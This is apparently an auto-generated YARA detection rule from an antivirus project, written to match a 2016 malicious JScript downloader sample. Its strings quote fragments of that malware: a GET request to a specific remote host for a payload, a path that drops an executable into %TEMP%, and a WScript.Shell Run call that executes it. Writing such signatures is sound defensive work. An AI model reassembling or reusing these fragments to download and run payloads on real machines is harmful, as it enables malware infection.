rule sig_20160328_783bcfe9809fd3081c92161c5e205b5b {
  meta:
    description = "datamaliciousorder - file 20160328_783bcfe9809fd3081c92161c5e205b5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5827539f3421f1058a0a7215d4c713d7682f7ddde83d7aa8aa6757cd77849d8f"

  strings:
    $s1  = "function Jjsmy() {return Fnwljt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"8dX2d8aQAUq.exe\";};" fullword ascii
    $s2  = "do {WScript[Dtqsbanw](Lmnfkuw() * 11)} while (Manudez[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Fnwljt = function Qazhsacr() {return WScript[Nspdueispa](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Boigoyutu(Ktnvgiiaq, Icraoku){return Ktnvgiiaq - Icraoku;};" fullword ascii
    $s5  = "Manudez[Goqtlsof](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Lycrvmts() {return ((Pbfgi == true) && (Pbfgi == Igdtsunk)) ? 1 : Pojupsrg;};" fullword ascii
    $s7  = "function Gfehbw(Azhtgbbejh){Fnwljt[\"Run\"](Azhtgbbejh, Pojupsrg, Pojupsrg);};" fullword ascii
    $s8  = " while (Lyyfbmwx){" fullword ascii
    $s9  = "Pbfgi = true; " fullword ascii
    $s10 = "Igdtsunk = true; " fullword ascii
    $s11 = "var Pbfgi = false;" fullword ascii
    $s12 = "function Lmnfkuw(){return 22;};" fullword ascii
    $s13 = "var Flwzxvjzv = new this[\"Date\"]();" fullword ascii
    $s14 = "function Fgvzqlx(){return Nspdueispa;};" fullword ascii
    $s15 = "var Igdtsunk = false;" fullword ascii
    $s16 = "var Ketdwzrt = false;" fullword ascii
    $s17 = "function Zxpivjdu()" fullword ascii
    $s18 = "function Gtbjizx(Oaqmfqjwxk) {var Rmebhk = (1, 2, 3, 4, 5, Oaqmfqjwxk); return Rmebhk;};" fullword ascii
    $s19 = "function Yuewp(){return Jlofu;};" fullword ascii
    $s20 = "return Boigoyutu(Ryajakk, Ofcmmtkbhu);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}